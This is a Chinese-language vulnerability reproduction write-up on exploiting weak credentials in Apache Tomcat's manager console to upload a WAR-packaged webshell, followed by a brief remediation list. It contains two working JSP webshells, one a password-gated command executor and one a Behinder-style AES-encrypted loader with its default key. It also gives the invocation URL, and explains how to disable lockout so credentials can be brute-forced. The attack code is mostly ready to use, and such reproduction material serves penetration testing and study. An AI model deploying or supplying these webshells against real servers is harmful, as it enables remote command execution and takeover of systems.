# tomcat war包部署

#### 1、漏洞原理

tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。若后台管理页面存在弱口令，则可以通过爆破获取密码。

Tomcat默认情况下是不允许任何人登录管理后台的，所以并没有设置的默认密码与用户名。但是如果有使用后台管理的需要时，可以在用户配置文件中（tomcat-users.xml）手动设置用户名和密码，并且根据其需要的功能设置用户权限。

其后台管理权限分为两种：一种是用于管理所部署Web应用，以manager开头，一个是用于管理虚拟主机，以admin开头。  
![image](https://image.3001.net/images/20220411/1649648474_6253a35a537b805bfa0c5.png!small)

进入容器查看tomcat-users.xml文件

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <tomcat-users xmlns="http://tomcat.apache.org/xml"
                  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
                  version="1.0">
    
        <role rolename="manager-gui"/>
        <role rolename="manager-script"/>
        <role rolename="manager-jmx"/>
        <role rolename="manager-status"/>
        <role rolename="admin-gui"/>
        <role rolename="admin-script"/>
        <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
        
    </tomcat-users>
    

![image](https://image.3001.net/images/20220411/1649648512_6253a38043bbac798a0de.png!small)

查看tomcat-users.xml文件可见，用户tomcat拥有上述所有权限，密码是tomcat

#### 2、漏洞复现

tomcat版本：8.0

tomcat后台地址：用户名 tomcat 密码 tomcat

    
    
    http://192.168.139.132:8080/manager/html
    

![image](https://image.3001.net/images/20220411/1649648544_6253a3a02d7bf4a19098b.png!small)

上传点

![image](https://image.3001.net/images/20220411/1649648574_6253a3becc07359992a29.png!small)

shell.jsp文件

    
    
    <%@ page language="java" contentType="text/html; charset=GBK"
        pageEncoding="UTF-8"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <title>一句话木马</title>
        </head>
    
        <body>
            <%
            if ("admin".equals(request.getParameter("pwd"))) {
                java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
                int len = -1;
                byte[] bytes = new byte[4092];
                out.print("<pre>");
                while ((len = input.read(bytes)) != -1) {
                    out.println(new String(bytes, "GBK"));
                }
                out.print("</pre>");
            }
        %>
        </body>
    
    </html>
    
    

打包成war包

![image](https://image.3001.net/images/20220411/1649648600_6253a3d8ab969738d000d.png!small)

上传war包成功

![image](https://image.3001.net/images/20220411/1649648625_6253a3f1520dc1bc4cfb5.png!small)

访问上传的jsp文件

    
    
    注意：war包部署后，tomcat会自动解压，shell.war 解压后就是shell/shell.jsp,因此地址为
    http://192.168.139.132:8080/shell/shell.jsp?pwd=admin&cmd=whoami
    

![image](https://image.3001.net/images/20220411/1649648651_6253a40b66395e58a66e6.png!small)命令执行成功

可以上传一句话木马，直接getshell

#### 3、一句话马getshell

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    

打包war包

![image](https://image.3001.net/images/20220411/1649648693_6253a4352fd5351687045.png!small)

直接冰蝎连接webshell

    
    
    注意：war包部署后，tomcat会自动解压，shell.war 解压后就是shell/shell.jsp,因此地址为
    地址：http://192.168.139.132:8080/shell/shell.jsp
    

![image](https://image.3001.net/images/20220411/1649648721_6253a451e61e8452edb2c.png!small)

#### 4、爆破若口令

当我们不知道密码时，可以进行强行爆破，但是tomcat6.0以后的版本，针对爆破做了锁定机制。

在conf/server.xml中添加一段代码

    
    
    failureCount="500"lockOutTime="0"    超时锁定数的设置。
    

![image](https://image.3001.net/images/20220411/1649648750_6253a46eda22dccd15d41.png!small)

burpsuite爆破

#### 5、修复方案

1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。

2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。

3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。

